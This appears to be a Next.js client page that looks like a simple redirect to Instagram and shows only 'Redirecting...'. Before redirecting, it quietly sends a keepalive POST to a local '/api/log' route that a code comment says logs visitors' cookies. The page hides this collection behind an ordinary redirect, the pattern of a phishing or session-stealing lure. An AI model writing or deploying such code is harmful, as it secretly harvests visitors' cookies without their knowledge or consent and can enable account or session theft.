'use client';

import { useEffect } from 'react';

export default function ProxyPage() {
  useEffect(() => {
    // Log cookies via API route
    fetch('/api/log', { method: 'POST', keepalive: true }).catch(() => {});
    // Redirect to Instagram
    window.location.href = "https://www.instagram.com/";
  }, []);

  return <div>Redirecting...</div>;
}
